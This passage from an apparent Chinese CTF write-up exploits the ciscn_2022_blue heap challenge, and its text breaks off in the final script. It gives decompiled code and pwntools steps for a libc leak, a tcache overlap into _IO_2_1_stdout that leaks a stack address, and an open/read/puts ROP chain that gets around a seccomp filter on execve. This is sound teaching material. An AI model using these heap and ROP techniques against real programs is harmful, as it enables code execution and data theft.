function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Done!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">int_secc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">str_2_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">uaf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      a1 <span class=\"token operator\">=</span> <span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a1<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/img/ciscn_2022_blue/image-20240621142032888.png\" alt=\"image-20240621142032888\"></p>\n<p>可见程序只 ban 了 execve，还是比较简单的。</p>\n<blockquote>\n<p>存在沙盒，一般我想到的是去利用 env 去泄露栈地址，然后再去劫持返回地址。</p>\n<p>只需要将 orw 写到返回地址上即可。</p>\n</blockquote>\n<h2 id=\"思路规整\"><a class=\"markdownIt-Anchor\" href=\"#思路规整\">#</a> 思路规整</h2>\n<p>show 只有一次，那如何即去泄露 libc 地址，又去泄露 stack 地址呢？显然想要 show 两次是不合适。第一次 show 只能是泄露 libc，因为去泄露 libc 之后才能得到 env。</p>\n<p>所以可以将 tcache 打满，然后利用 unsortedbin 去泄露 libc</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>而第二次我们需要去泄露 env，但是 uaf 和 show 都用过一次了，那如何去利用呢。</p>\n<p>那么就需要去了解一下 IO_FILE 了，stdout。<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3L2FydGljbGUvZGV0YWlscy8xMTM4NDUzMjA=\">好好说话之 IO_FILE 利用（1）：利用_IO_2_1_stdout 泄露 libc_libc 泄露方式 - CSDN 博客</span></p>\n<p>这篇文章已经写的很详细了。</p>\n<p>从此文中，我们可以将 fake 一个堆块到_IO_2_1_stdout，然后将其 Flags 改成 <code>0xfdab1800</code> ，再将 _IO_write_base 改成我们想泄露的地址的 <code>起始地址</code> ，最后把 _IO_write_ptr 和 _IO_write_end 改成泄露地址的 <code>终点地址</code> 即可。</p>\n<p>但是程序当中已经没有 uaf，那如何在去控制 fd 去做我们的 fake_chunk 呢？</p>\n<p>利用 tcache 去做是比较简单的。那如何去利用呢？</p>\n<p>对，使用堆拓展攻击即可。</p>\n<p><img data-src=\"/img/ciscn_2022_blue/image-20240621145849635.png\" alt=\"image-20240621145849635\"></p>\n<p>这是此时 bins 链表。所以我们需要修改一下泄露 libc 的代码，要不然无法进行堆拓展攻击</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>env <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>接下来进行堆拓展攻击</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#置入 unsortedbin 内</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#此时 unsortedbin 内包含这 tcache</span></pre></td></tr></table></figure><p><img data-src=\"/img/ciscn_2022_blue/image-20240621151328883.png\" alt=\"image-20240621151328883\"></p>\n<p>此时我们去申请一个 chunk 使其从 unsortedbin 拿取。所以申请个 0x70（size&lt;0x110 且不能等于 0x80</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#此时就会修改 tcache 的 fd 指针   #2</span></pre></td></tr></table></figure><p>然后此时再去申请 0x80 的 chunk 就可以得到 _IO_2_1_stdout 的 chunk</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfdab1800</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr></table></figure><blockquote>\n<p>pwndbg&gt; dps 0x7ffff7fc26a0<br>\n00:0000│ rsi 0x7ffff7fc26a0 (<em>IO_2_1_stdout</em>) ◂— 0xfdab1800<br>\n01:0008│     0x7ffff7fc26a8 (<em>IO_2_1_stdout</em>+8) ◂— 0x0<br>\n… ↓        2 skipped<br>\n04:0020│     0x7ffff7fc26c0 (<em>IO_2_1_stdout</em>+32) —▸ 0x7ffff7fc4600 (environ) —▸ 0x7fffffffdef8 —▸ 0x7fffffffe25e ◂— ‘SHELL=/bin/bash’<br>\n05:0028│     0x7ffff7fc26c8 (<em>IO_2_1_stdout</em>+40) —▸ 0x7ffff7fc4608 ◂— 0x0<br>\n06:0030│     0x7ffff7fc26d0 (<em>IO_2_1_stdout</em>+48) —▸ 0x7ffff7fc4608 ◂— 0x0<br>\n07:0038│     0x7ffff7fc26d8 (<em>IO_2_1_stdout</em>+56) —▸ 0x7ffff7fc2723 (<em>IO_2_1_stdout</em>+131) ◂— 0xfc37e0000000000a /* ‘\\n’ */</p>\n</blockquote>\n<p>此时只要去执行一次 puts 或者 prinf 就可以泄露栈地址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000023b6a</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002601f</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>pop_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000142c92</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sendfile_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'sendfile'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>puts <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> stack_addr</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'./flag\\x00\\x00'</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># open('./flag', 0)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># read(3, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># write(1, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(stack_addr - 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(write_addr)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(3) + p64(pop_rdx_ret) + p64(0) + p64(sendfile_addr)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>再次利用堆拓展攻击，申请到栈上，劫持返回地址进行 orw 即可</p>\n<h2 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># host, port = \"47.103.122.127:30175\".split(\":\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(host, int(port))</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token 